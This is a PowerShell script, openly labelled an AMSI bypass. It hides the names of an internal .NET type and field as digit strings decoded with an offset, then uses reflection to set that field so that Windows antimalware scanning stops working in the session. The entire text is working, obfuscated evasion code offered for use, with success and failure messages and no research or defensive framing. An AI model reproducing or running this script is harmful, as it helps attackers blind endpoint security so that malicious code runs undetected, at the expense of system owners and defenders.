# Function-Wrapped Numeric Decode AMSI Bypass
# Encapsulates decode logic in a reusable function with configurable offset

$P1="5896909176842152728572787684768591214092918684729180"
$P2="8685214084908060918083907284908048858091457280837675"

function Invoke-SeqDecode {
    param([int]$from, [int]$to, [string]$data, [int]$key)
    [string]($from..$to | ForEach-Object {
        [char][int]($key + $data.Substring(($_ * 2), 2))
    }) -replace " "
}

$combined = $P1 + $P2
$tName = Invoke-SeqDecode -from 0 -to 37 -data $combined -key 25
$fName = Invoke-SeqDecode -from 38 -to 51 -data $combined -key 25

$target = [Ref].Assembly.GetType($tName)
if ($target) {
    $field = $target.GetField($fName, 'NonPublic,Static')
    if ($field) {
        $field.SetValue($null, $true)
        Write-Host "[+] AMSI Bypass Applied (Function Decode Method)" -ForegroundColor Green
    } else {
        Write-Host "[-] Field not found" -ForegroundColor Red
    }
} else {
    Write-Host "[-] Type not resolved" -ForegroundColor Red
}
